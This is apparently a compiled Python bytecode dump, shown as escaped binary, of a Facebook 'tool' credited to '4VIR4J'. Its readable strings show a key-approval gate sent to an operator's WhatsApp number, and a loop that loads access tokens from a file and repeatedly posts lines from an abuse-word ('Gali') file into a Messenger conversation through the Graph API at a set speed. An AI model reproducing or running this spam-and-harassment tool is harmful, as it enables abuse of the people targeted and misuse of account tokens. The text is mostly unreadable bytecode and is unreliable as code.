1\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0ed\x08\xac\t\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0ft\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00|\x00z\x00\x00\x00d\x10\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x11\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x02t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x12\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x03t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x13\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x04t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\n\x00\x00\x00\x00\x00\x00\x00\x00d\x14\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x15|\x03z\x00\x00\x00d\x16z\x00\x00\x00|\x02z\x00\x00\x00d\x17z\x00\x00\x00|\x04z\x00\x00\x00}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x18|\x05z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00)\x19Nr,\x00\x00\x00r-\x00\x00\x00r\'\x00\x00\x00z:https://github.com/9NOX123/Trick1/blob/main/Trick1.txtz$\t \x1b[1;32m First Get Approvel\x1b[1;37m r\x07\x00\x00\x00r/\x00\x00\x00r0\x00\x00\x00r1\x00\x00\x00z, \x1b[1;32m You Need Get Approved First\x1b[1;37m\nz! \x1b[1;32m  [=[ 4VIIR4J ]=] \x1b[1;37mz\x1a Your Key is Not Approved z\x1b Copy And Send Key To Adminz\n\x1b[1;34;40mz\x0f--> Your Key : \xfa\x01\nz\x1d--> Please Enter Your Name : z\x1e--> Please Enter Your Email : z\x1e--> Please Enter To Send Key :g\x00\x00\x00\x00\x00\x00\x0c@z\xd6Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20z\x94%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20z\x99%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20z*am start https://wa.me/+918340514701?text=)\x0e\xda\x04open\xda\x04readr\x1d\x00\x00\x00r\x03\x00\x00\x00r\x1b\x00\x00\x00\xda\x03get\xda\x04textr\r\x00\x00\x00\xda\x04logo\xda\x04timer\x04\x00\x00\x00\xda\x02ak\xda\x05input\xda\x0cSubscraption)\x06\xda\x04key1\xda\x02r1\xda\x04name\xda\x03lol\xda\x03k3y\xda\x03tkss\x06\x00\x00\x00      r\x18\x00\x00\x00r=\x00\x00\x00r=\x00\x00\x00\xab\x00\x00\x00s4\x02\x00\x00\x80\x00\xdd\x06\n\xd0\x0b=\xb8s\xd1\x06C\xd4\x06C\xd7\x06H\xd2\x06H\xd1\x06J\xd4\x06J\x80\x14\xe5\x01\x03\x84\x19\x887\xd1\x01\x13\xd4\x01\x13\xd0\x01\x13\xdd\x04\x0c\x84L\xd0\x11M\xd1\x04N\xd4\x04N\xd4\x04S\x80\x12\xd8\x04\x08\x88B\x80J\x80J\xdd\x02\x04\x84)\x88G\xd1\x02\x14\xd4\x02\x14\xd0\x02\x14\xd0\x02\x14\xd0\x02\x14\xf5\x06\x00\x03\x05\x84)\x88G\xd1\x02\x14\xd4\x02\x14\xd0\x02\x14\xdd\x02\x07\x8d\x04\x81+\x84+\x80+\xdd\x02\x07\xd0\x085\xd1\x026\xd4\x026\xd0\x026\xdd\x02\x06\x84*\x88Q\x81-\x84-\x80-\xdd\x02\x04\x84)\x88G\xd1\x02\x14\xd4\x02\x14\xd0\x02\x14\xdd\x02\x07\x88\x0f\x98r\xd0\x02"\xd1\x02"\xd4\x02"\xd0\x02"\xdd\x02\x07\x8d\x04\x81+\x84+\x80+\xdd\x02\x07\x88\x12\x81*\x84*\x80*\xdd\x02\x07\xd0\x08=\xd1\x02>\xd4\x02>\xd0\x02>\xdd\x02\x07\xd0\x081\xd1\x022\xd4\x022\xd0\x022\xdd\x02\x07\x88\x0f\x98r\xd0\x02"\xd1\x02"\xd4\x02"\xd0\x02"\xdd\x02\x07\x88\x12\x81*\x84*\x80*\xdd\x02\x07\xd0\x08$\xd1\x02%\xd4\x02%\xd0\x02%\xdd\x02\x07\x88\x02\x81)\x84)\x80)\xdd\x02\x07\xd0\x08%\xd1\x02&\xd4\x02&\xd0\x02&\xdd\x02\x07\x88\x0f\x98r\xd0\x02"\xd1\x02"\xd4\x02"\xd0\x02"\xdd\x02\x07\x88\x12\x81*\x84*\x80*\xdd\x02\x07\xd0\t\x1a\x9d2\xd1\t\x1d\x98d\xd1\t"\xa0D\xd1\x02)\xd4\x02)\xd0\x02)\xdd\x02\x07\x88\x12\x81*\x84*\x80*\xdd\t\x0e\xd0\x0f.\xd1\t/\xd4\t/\x80$\xdd\x02\x07\x88\x12\x81*\x84*\x80*\xdd\x08\r\xd0\x0e.\xd1\x08/\xd4\x08/\x80#\xdd\x02\x07\x88\x12\x81*\x84*\x80*\xdd\x06\x0b\xd0\x0c,\xd1\x06-\xd4\x06-\x80#\xdd\x02\x06\x84*\x88S\x81/\x84/\x80/\xf0\x02\x00\ta\x03\xf0\x00\x00b\x03e\x03\xf1\x00\x00\te\x03\xf0\x00\x00f\x03|\x05\xf1\x00\x00\t|\x05\xf0\x00\x00}\x05A\x06\xf1\x00\x00\tA\x06\xf0\x00\x00B\x06]\x08\xf1\x00\x00\t]\x08\xf0\x00\x00^\x08a\x08\xf1\x00\x00\ta\x08\x80#\xdd\x02\x04\x84)\xd0\x0c8\xb83\xd1\x0c>\xd1\x02?\xd4\x02?\xd0\x02?\xdd\x02\x0e\x81.\x84.\x80.\x80.\x80.r\x17\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3\xfc\x00\x00\x00\x97\x00d\x01}\x00g\x00d\x02\xa2\x01}\x01d\x03}\x02t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x02\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]P\\\x02\x00\x00}\x03}\x04t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x04|\x00f\x03z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8cQd\x00S\x00)\x07Nr\x05\x00\x00\x00)\x03\xe9#\x00\x00\x00\xe9!\x00\x00\x00\xe9$\x00\x00\x00a!\x02\x00\x00\n   \n\n\n$$$$$$$\\  $$\\   $$\\                         $$\\       \n$$  __$$\\ \\__|  $$ |                        $$ |      \n$$ |  $$ |$$\\ $$$$$$\\    $$$$$$\\   $$$$$$$\\ $$$$$$$\\  \n$$$$$$$  |$$ |\\_$$  _|  $$  __$$\\ $$  _____|$$  __$$\\ \n$$  __$$< $$ |  $$ |    $$$$$$$$ |\\$$$$$$\\  $$ |  $$ |\n$$ |  $$ |$$ |  $$ |$$\\ $$   ____| \\____$$\\ $$ |  $$ |\n$$ |  $$ |$$ |  \\$$$$  |\\$$$$$$$\\ $$$$$$$  |$$ |  $$ |\n\\__|  \\__|\\__|   \\____/  \\_______|\\_______/ \\__|  \\__|                                                                                                  \nr4\x00\x00\x00z\x0c\x1b[1;%dm%s%s\ng\x9a\x99\x99\x99\x99\x99\xa9?)\t\xda\tenumerate\xda\x05splitr\x13\x00\x00\x00\xda\x06stdout\xda\x05write\xda\x06random\xda\x06choicer:\x00\x00\x00r\x04\x00\x00\x00)\x05r\'\x00\x00\x00\xda\x06colors\xda\x01x\xda\x01N\xda\x04lines\x05\x00\x00\x00     r\x18\x00\x00\x00r9\x00\x00\x00r9\x00\x00\x00\xd4\x00\x00\x00s\x88\x00\x00\x00\x80\x00\xd8\x0c\x15\x80E\xd8\r\x19\x88\\\x88\\\x80F\xf0\x04\x0c\t\x04\x80A\xf5\x1a\x00\x14\x1d\x98Q\x9fW\x9aW\xa0T\x99]\x9c]\xd1\x13+\xd4\x13+\xf0\x00\x02\x05\x19\xf0\x00\x02\x05\x19\x89\x07\x88\x01\x884\xdd\x08\x0b\x8c\n\xd7\x08\x18\xd2\x08\x18\xd0\x19+\xadv\xac}\xb8V\xd1/D\xd4/D\xc0d\xc8E\xd0.R\xd1\x19R\xd1\x08S\xd4\x08S\xd0\x08S\xdd\x08\x0c\x8c\n\x904\xd1\x08\x18\xd4\x08\x18\xd0\x08\x18\xd0\x08\x18\xf0\x05\x02\x05\x19\xf0\x00\x02\x05\x19r\x17\x00\x00\x00zM\x1b[1;33m---------------------------------------------------------------------\nz\nkeep-alivez\tmax-age=0\xda\x011z\xa0Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8z\rgzip, deflatez\x17en-US,en;q=0.9,fr;q=0.8z\x0ewww.google.com)\x08\xda\nConnectionz\rCache-Controlz\x19Upgrade-Insecure-Requestsz\nUser-Agent\xda\x06Acceptz\x0fAccept-Encodingz\x0fAccept-Language\xda\x07refererc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3\xc4\x02\x00\x00\x97\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00\x90\x01]V}\x01\t\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x01z\x00\x00\x00}\x00d\x01\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x02t\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x03\x9c\x02}\x03t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x07\x00\x00\x00\x00\x00\x00\x00\x00|\x02|\x03t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x04\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x04t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\n\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x05|\x04j\x0c\x00\x00\x00\x00\x00\x00\x00\x00rRt\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x06t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\n\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x07|\x00z\x00\x00\x00\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x0f\x00\x00\x00\x00\x00\x00\x00\x00t \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n,t\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08|\x05z\x00\x00\x00d\t\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x0f\x00\x00\x00\x00\x00\x00\x00\x00t \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x90\x01\x8c\x18#\x00t"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r3}\x06t\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x0f\x00\x00\x00\x00\x00\x00\x00\x00t \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00d\x00}\x06~\x06\x90\x01\x8cPd\x00}\x06~\x06w\x01w\x00x\x03Y\x00w\x01d\x00S\x00)\nN\xfa%https://graph.facebook.com/v15.0/{0}/\xda\x02t_\xa9\x02\xda\x0caccess_token\xda\x07message\xa9\x02\xda\x04data\xda\x07headersz\x14%Y-%m-%d %I:%M:%S %pz.\x1b[1;32m[+] Sahii Haii... | [+] Time :: \x1b[1;32mz6\n\x1b[1;32m[+] Haan Chala Gaya Tera Message ==> \x1b[1;32;1mz\x19\x1b[1;32m[x] Message Block u\x12\x00\x00\x00\n[\xc3\x97] Token Error\n)\x12\xda\x02ns\xda\x03str\xda\x02mnr\x1e\x00\x00\x00\xda\tthread_idrZ\x00\x00\x00r\x1b\x00\x00\x00\xda\x04postr^\x00\x00\x00r"\x00\x00\x00\xda\x03now\xda\x08strftime\xda\x02okr\r\x00\x00\x00r:\x00\x00\x00r\x04\x00\x00\x00\xda\x04timm\xda\tException)\x07r[\x00\x00\x00\xda\x01i\xda\x03url\xda\nparameters\xda\x01s\xda\x02tt\xda\x01es\x07\x00\x00\x00       r\x18\x00\x00\x00\xda\x14message_on_messengerro\x00\x00\x00\xfd\x00\x00\x00sP\x01\x00\x00\x80\x00\xdd\r\x0f\xf0\x00\x11\x05\x1d\xf1\x00\x11\x05\x1d\x88\x01\xf0\x02\x10\t\x1d\xdd\x16\x19\x9d"\x91g\x94g\xa0\x01\x91k\x88G\xd8\x129\xd7\x12@\xd2\x12@\xc0\x14\xcd\x03\xcdI\xc9\x0e\xcc\x0e\xd1AV\xd1\x12W\xd4\x12W\x88C\xdd*6\xc07\xd0\x19K\xd0\x19K\x88J\xdd\x10\x18\x94\r\x98c\xa8\n\xbdG\xd0\x10D\xd1\x10D\xd4\x10D\x88A\xdd\x11\x19\x94\x1c\x91\x1e\x94\x1e\xd7\x11(\xd2\x11(\xd0)?\xd1\x11@\xd4\x11@\x88B\xe0\x0f\x10\x8ct\xf0\x00\x06\r!\xdd\x10\x15\xd0\x16L\xcdh\xccl\xc9n\xccn\xd7Ne\xd2Ne\xd0f|\xd1N}\xd4N}\xd8\x16U\xd0X_\xd1\x16_\xf1\x03\x01\x11a\x01\xf4\x00\x01\x11a\x01\xf0\x00\x01\x11a\x01\xe5\x10\x14\x94\n\x9d4\xd1\x10 \xd4\x10 \xd0\x10 \xd0\x10 \xe5\x10\x15\xd0\x164\xb0r\xd1\x169\xd0;Q\xd1\x10R\xd4\x10R\xd0\x10R\xdd\x10\x14\x94\n\x9d4\xd1\x10 \xd4\x10 \xd0\x10 \xf9\xf8\xdd\x0f\x18\xf0\x00\x02\t\x1d\xf0\x00\x02\t\x1d\xf0\x00\x02\t\x1d\xdd\x0c\x11\x90!\x89H\x8cH\x88H\xdd\x0c\x10\x8cJ\x95t\xd1\x0c\x1c\xd4\x0c\x1c\xd0\x0c\x1c\xd0\x0c\x1c\xd0\x0c\x1c\xd0\x0c\x1c\xd0\x0c\x1c\xd1\x0c\x1c\xf8\xf8\xf8\xf8\xf0\x05\x02\t\x1d\xf8\xf8\xf8\xf0\x1f\x11\x05\x1d\xf0\x00\x11\x05\x1ds\x18\x00\x00\x00\x8cD\x12D \x02\xc4 \nE\x1d\x05\xc4*(E\x18\x05\xc5\x18\x05E\x1d\x05c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\xf3\x9e\x00\x00\x00\x97\x00\t\x00d\x01}\x00d\x00S\x00#\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\x1a}\x01t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00d\x00}\x01~\x01d\x00S\x00d\x00}\x01~\x01w\x01t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\x1a}\x01t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00d\x00}\x01~\x01d\x00S\x00d\x00}\x01~\x01w\x01w\x00x\x03Y\x00w\x01)\x04Nz\x18https://www.facebook.comz\nHTTP Errorz\tURL Error)\x03\xda\tHTTPErrorr\r\x00\x00\x00\xda\x08URLError)\x02rj\x00\x00\x00rn\x00\x00\x00s\x02\x00\x00\x00  r\x18\x00\x00\x00\xda\x0cget_messagesrs\x00\x00\x00\x11\x01\x00\x00s\x85\x00\x00\x00\x80\x00\xf0\x02\x05\x05\x1b\xd8\x0e(\x88\x03\x88\x03\x88\x03\xf8\xdd\x0b\x14\xf0\x00\x01\x05\x1c\xf0\x00\x01\x05\x1c\xf0\x00\x01\x05\x1c\xdd\x08\r\x88l\xd1\x08\x1b\xd4\x08\x1b\xd0\x08\x1b\xd0\x08\x1b\xd0\x08\x1b\xd0\x08\x1b\xd0\x08\x1b\xd0\x08\x1b\xd0\x08\x1b\xf8\xf8\xf8\xf8\xdd\x0b\x13\xf0\x00\x01\x05\x1b\xf0\x00\x01\x05\x1b\xf0\x00\x01\x05\x1b\xdd\x08\r\x88k\xd1\x08\x1a\xd4\x08\x1a\xd0\x08\x1a\xd0\x08\x1a\xd0\x08\x1a\xd0\x08\x1a\xd0\x08\x1a\xd0\x08\x1a\xd0\x08\x1a\xf8\xf8\xf8\xf8\xf0\x03\x01\x05\x1b\xf8\xf8\xf8s\x1d\x00\x00\x00\x82\x02\x06\x00\x86\nA\x0c\x03\x90\x0f%\x03\xa5\rA\x0c\x03\xb2\x0fA\x07\x03\xc1\x07\x05A\x0c\x03zM\x1b[1;36m---------------------------------------------------------------------\nz6\x1b[1;35m-=[ Facebook Tool Pool Ka Super Hero aviraj ]=-zD\x1b[1;33m-=[ Contact Us :: https://www.facebook.com/avi.love.arfa ]=-\nz/\x1b[1;32m[#] Start Time ==> %Y-%m-%d %I:%M:%S %p z)\x1b[1;32m[#] _ Tool Fucker == > [ 4VIR4J ]\nz\x1d\x1b[1;36m[+] Enter Password :: z\x0eano aprovz\x1d[+] Input Token File Name :: r4\x00\x00\x00rZ\x00\x00\x00z#https://graph.facebook.com/v15.0/me)\x01\xda\x06paramsr@\x00\x00\x00z\x16\n[x] Token Invalid..!!\xda\x02idz\'\x1b[1;32mYour Profile Name :: \x1b[1;32;1m%srW\x00\x00\x00\xda\x11t_100017822895891z\x18Account Login Token ::- z\x11Account Name ::- z2Account Facebook I\'d ::- https://www.facebook.com/rY\x00\x00\x00r\\\x00\x00\x00z\'\x1b[1;36m[+] Conservation ID :: \x1b[1;32;1mz\'\x1b[1;36m[+] Enter Kidx Name :: \x1b[1;32;1mz*\x1b[1;36m[+] Add Gali File Name :: \x1b[1;32;1mz&\x1b[1;36m[+] File Repeat No :: \x1b[1;32;1mz(\x1b[1;36m[+] Speed in Seconds :: \x1b[1;32;1mz5\x1b[1;34m________All Done....Loading Profile Info.....!z\x1c\x1b[1;34mYour Profile Name :: z\n\x1b[1;31;40mzH\n\x1b[1;31m[-] <==> Your Password Is Wrong Please Take Approval From Owner\n)\x90\xda\x08platformr\x03\x00\x00\x00r\x13\x00\x00\x00r\x1d\x00\x00\x00r"\x00\x00\x00r:\x00\x00\x00r\x04\x00\x00\x00\xda\x07getpassrj\x00\x00\x00\xda\x01W\xda\x01R\xda\x01G\xda\x01Y\xda\x01B\xda\x01P\xda\x01CrP\x00\x00\x00r\x1b\x00\x00\x00\xda\x0bImportError\xda\x12concurrent.futures\xda\nconcurrentrL\x00\x00\x00\xda\x06base64\xda\nsubprocessr\x06\x00\x00\x00\xda\x03bs4\xda\x04uuid\xda\x04json\xda\x02re\xda\x04richr\x15\x00\x00\x00\xda\nrich.tabler\x08\x00\x00\x00\xda\x02me\xda\x0crich.consoler\t\x00\x00\x00\xda\x03solr\n\x00\x00\x00\xda\x03sop\xda\x04tredr\x0b\x00\x00\x00\xda\x02gp\xda\nrich.panelr\x0c\x00\x00\x00\xda\x03nelr\r\x00\x00\x00\xda\x05cetak\xda\rrich.markdownr\x0e\x00\x00\x00\xda\x04mark\xda\x0crich.columnsr\x0f\x00\x00\x00\xda\x03col\xda\x0curllib.parser\x10\x00\x00\x00\xda\x05ugen2\xda\x04ugenr\x19\x00\x00\x00r!\x00\x00\x00\xda\x08binascii\xda\tthreading\xda\x06pprint\xda\x07smtplib\xda\ttelnetlib\xda\x07os.path\xda\x07hashlib\xda\x06string\xda\x04glob\xda\x07sqlite3\xda\x06urllib\xda\x08argparse\xda\x07marshalr\x1c\x00\x00\x00r#\x00\x00\x00r$\x00\x00\x00\xda\x08packages\xda\x07urllib3\xda\x10disable_warningsr)\x00\x00\x00\xda\x0cCLEAR_SCREEN\xda\x03RED\xda\x05RESET\xda\x04BLUE\xda\x05WHITE\xda\x06YELLOW\xda\x04CYAN\xda\x07MAGENTA\xda\x05GREEN\xda\x04BOLD\xda\x07REVERSE\xda\x03imtr;\x00\x00\x00\xda\x05uuid4\xda\x03hex\xda\x05upper\xda\x04myidr5\x00\x00\x00r6\x00\x00\x00r>\x00\x00\x00\xda\x03kokrK\x00\x00\x00\xda\x05closer9\x00\x00\x00r=\x00\x00\x00r^\x00\x00\x00ro\x00\x00\x00rs\x00\x00\x00rd\x00\x00\x00ri\x00\x00\x00re\x00\x00\x00r<\x00\x00\x00\xda\x08password\xda\x05token\xda\x02f2rZ\x00\x00\x00\xda\x07payload\xda\x01ar7\x00\x00\x00\xda\x01b\xda\x05loadsr8\x00\x00\x00\xda\x01d\xda\x02mb\xda\x07user_idr\x1e\x00\x00\x00\xda\x02kkr`\x00\x00\x00\xda\x08message3\xda\x08message4\xda\x08message7\xda\x08message5\xda\x0bparameters3rc\x00\x00\x00\xda\x02s2rb\x00\x00\x00ra\x00\x00\x00\xda\x02ms\xda\x03int\xda\x06repeatrg\x00\x00\x00\xda\treadlinesr_\x00\x00\x00\xda\x05range\xda\tmessengerr\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00\xfa\x08<module>r\xd4\x00\x00\x00\x01\x00\x00\x00s\xbd\n\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x1b\xd0\x00\x1b\xd0\x00\x1b\xd0\x00\x1b\xd0\x00\x1b\xd0\x00\x1b\xd8\x00\n\x80\n\x80\n\x80\n\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\x0f\x80\x0f\x80\x0f\x80\x0f\xd8\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd8\x00\x0e\x80\x0e\x80\x0e\x80\x0e\xd8\x06(\x80\x03\xd8\x04\x10\x80\x01\xd8\x04\x10\x80\x01\xd8\x04\x10\x80\x01\xd8\x04\x10\x80\x01\xd8\x04\x10\x80\x01\xd8\x04\x10\x80\x01\xd8\x04\x10\x80\x01\xd8\x04\r\x80\x01\xd8\x00\t\x80\t\x80\t\x80\t\xf0\x02\x03\x01#\xd8\x01\x10\x80\x1f\x80\x1f\x80\x1f\x80\x1f\xf8\xd8\x07\x12\xf0\x00\x01\x01#\xf0\x00\x01\x01#\xf0\x00\x01\x01#\xd8\x01\n\x80\x12\x84\x19\xd0\x0b!\xd1\x01"\xd4\x01"\xd0\x01"\xd0\x01"\xd0\x01"\xf0\x03\x01\x01#\xf8\xf8\xf8\xf0\x06\x03\x01"\xd8\x01\x1a\xd0\x01\x1a\xd0\x01\x1a\xd0\x01\x1a\xd0\x01\x1a\xf8\xd8\x07\x12\xf0\x00\x01\x01"\xf0\x00\x01\x01"\xf0\x00\x01\x01"\xd8\x01\n\x80\x12\x84\x19\xd0\x0b \xd1\x01!\xd4\x01!\xd0\x01!\xd0\x01!\xd0\x01!\xf0\x03\x01\x01"\xf8\xf8\xf8\xf0\x06\x00\x01\n\x80\t\x80\t\x80\t\xd8\x00\n\x80\n\x80\n\x80\n\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\x0f\x80\x0f\x80\x0f\x80\x0f\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x0f\x80\x0f\x80\x0f\x80\x0f\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x0e\x80\x0e\x80\x0e\x80\x0e\xd8\x00\x11\xd0\x00\x11\xd0\x00\x11\xd0\x00\x11\xd8\x001\xd0\x001\xd0\x001\xd0\x001\xd0\x001\xd0\x001\xd8\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xd0\x00G\xf0\x02\x08\x01P\x01\xd8\x01\x0c\x80\x1b\x80\x1b\x80\x1b\x80\x1b\xf8\xd8\x07\x12\xf0\x00\x06\x01P\x01\xf0\x00\x06\x01P\x01\xf0\x00\x06\x01P\x01\xd8\x01\n\x80\x12\x84\x19\xd0\x0b\